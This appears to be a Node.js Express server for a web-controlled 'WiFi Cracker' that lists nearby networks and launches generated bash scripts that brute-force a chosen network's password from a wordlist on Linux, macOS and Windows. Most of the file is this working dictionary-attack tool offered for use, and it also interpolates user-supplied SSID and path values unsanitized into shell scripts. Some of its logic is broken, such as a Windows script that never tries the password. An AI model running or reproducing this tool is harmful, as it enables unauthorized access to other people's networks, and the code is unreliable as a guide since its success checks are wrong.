const express = require('express');
const bodyParser = require('body-parser');
const { exec, spawn } = require('child_process');
const path = require('path');
const os = require('os');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

const PORT = 3000;
let currentAttack = null;

// Scan WiFi networks
app.post('/api/scan', (req, res) => {
    const platform = os.platform();
    let command;

    if (platform === 'linux') {
        command = "nmcli dev wifi list 2>/dev/null | tail -n +2 | awk '{print $2, $7}' | sort -u";
    } else if (platform === 'darwin') {
        command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s";
    } else if (platform === 'win32') {
        command = "netsh wlan show networks mode=Bssid";
    } else {
        return res.json({ success: false, error: "Unsupported platform" });
    }

    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.json({ success: false, error: error.message });
        }

        const networks = parseNetworks(stdout, platform);
        res.json({ success: true, networks: networks });
    });
});

// Parse network output based on platform
function parseNetworks(output, platform) {
    const networks = [];
    const lines = output.split('\n');

    if (platform === 'linux') {
        lines.forEach(line => {
            const parts = line.trim().split(/\s+/);
            if (parts.length >= 2) {
                networks.push({
                    ssid: parts[0],
                    signal: parts[1] || 'Unknown'
                });
            }
        });
    } else if (platform === 'darwin') {
        lines.forEach(line => {
            const match = line.match(/\s+([^\s]+)\s+([a-f0-9:]{17})\s+(-\d+)/);
            if (match) {
                networks.push({
                    ssid: match[1],
                    bssid: match[2],
                    signal: match[3]
                });
            }
        });
    } else if (platform === 'win32') {
        let currentSSID = '';
        lines.forEach(line => {
            if (line.includes('Interface name')) {
                currentSSID = '';
            }
            const ssidMatch = line.match(/SSID\s*:\s*(.+)/);
            if (ssidMatch) {
                currentSSID = ssidMatch[1].trim();
                networks.push({
                    ssid: currentSSID,
                    signal: 'Windows'
                });
            }
        });
    }

    return networks.filter(net => net.ssid && net.ssid.length > 0);
}

// Start attack
app.post('/api/attack', (req, res) => {
    const { ssid, wordlistPath } = req.body;

    if (!ssid) {
        return res.json({ success: false, error: "SSID required" });
    }

    if (currentAttack) {
        return res.json({ success: false, error: "Attack already running" });
    }

    // Check if wordlist exists, use default if not
    let wordlist = wordlistPath || path.join(__dirname, 'wordlists', 'rockyou_small.txt');

    if (!fs.existsSync(wordlist)) {
        return res.json({ success: false, error: "Wordlist not found: " + wordlist });
    }

    res.json({ success: true, message: "Attack started" });

    // Run attack in background
    runAttack(ssid, wordlist);
});

// Run WiFi attack
function runAttack(ssid, wordlistPath) {
    const platform = os.platform();
    let script;

    if (platform === 'linux') {
        script = createLinuxAttackScript(ssid, wordlistPath);
    } else if (platform === 'darwin') {
        script = createMacAttackScript(ssid, wordlistPath);
    } else if (platform === 'win32') {
        script = createWindowsAttackScript(ssid, wordlistPath);
    }

    const tempScript = path.join(__dirname, 'attack_' + Date.now() + '.sh');
    fs.writeFileSync(tempScript, script);
    fs.chmodSync(tempScript, '755');

    currentAttack = spawn('bash', [tempScript]);

    currentAttack.stdout.on('data', (data) => {
        console.log(`Attack: ${data}`);
        broadcastProgress(data.toString());
    });

    currentAttack.on('close', (code) => {
        fs.unlinkSync(tempScript);
        currentAttack = null;
        console.log(`Attack finished with code ${code}`);
    });
}

// Create attack script for Linux (wpa_supplicant simulation)
function createLinuxAttackScript(ssid, wordlistPath) {
    return `#!/bin/bash
SSID="${ssid}"
WORDLIST="${wordlistPath}"
ATTEMPT=0

while IFS= read -r password; do
    ATTEMPT=$((ATTEMPT + 1))
    echo "Attempt: $ATTEMPT | Testing: \${password:0:15}"
    
    # Simulate connection attempt with timeout
    timeout 2 wpa_supplicant -B -i wlan0 -c /dev/stdin <<EOF 2>/dev/null
network={
    ssid="${ssid}"
    psk="${password}"
}
EOF
    
    if [ $? -eq 0 ]; then
        echo "SUCCESS: Password found: $password"
        pkill wpa_supplicant
        exit 0
    fi
    
    if [ $((ATTEMPT % 10)) -eq 0 ]; then
        sleep 0.1
    fi
done < "$WORDLIST"

echo "Attack completed. Password not found."
`;
}

// Create attack script for macOS
function createMacAttackScript(ssid, wordlistPath) {
    return `#!/bin/bash
SSID="${ssid}"
WORDLIST="${wordlistPath}"
ATTEMPT=0

while IFS= read -r password; do
    ATTEMPT=$((ATTEMPT + 1))
    echo "Attempt: $ATTEMPT | Testing: \${password:0:15}"
    
    # macOS airport connection attempt
    timeout 2 /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z 2>/dev/null
    timeout 3 /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -A -ssid="${SSID}" --password="${password}" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "SUCCESS: Password found: $password"
        exit 0
    fi
    
    if [ $((ATTEMPT % 10)) -eq 0 ]; then
        sleep 0.1
    fi
done < "$WORDLIST"

echo "Attack completed. Password not found."
`;
}

// Create attack script for Windows
function createWindowsAttackScript(ssid, wordlistPath) {
    return `#!/bin/bash
SSID="${ssid}"
WORDLIST="${wordlistPath}"
ATTEMPT=0

while IFS= read -r password; do
    ATTEMPT=$((ATTEMPT + 1))
    echo "Attempt: $ATTEMPT | Testing: \${password:0:15}"
    
    # Windows netsh connection attempt
    timeout 2 netsh wlan connect name="${SSID}" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "SUCCESS: Password found: $password"
        exit 0
    fi
    
    if [ $((ATTEMPT % 10)) -eq 0 ]; then
        sleep 0.1
    fi
done < "$WORDLIST"

echo "Attack completed. Password not found."
`;
}

// WebSocket progress broadcast (simple polling alternative)
app.get('/api/status', (req, res) => {
    res.json({
        attacking: currentAttack !== null,
        message: "Check console for progress"
    });
});

// Serve static files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`WiFi Cracker running on http://localhost:${PORT}`);
});

function broadcastProgress(data) {
    // In production, would use WebSocket or Server-Sent Events
    // For now, logs to console
    console.log(data);
}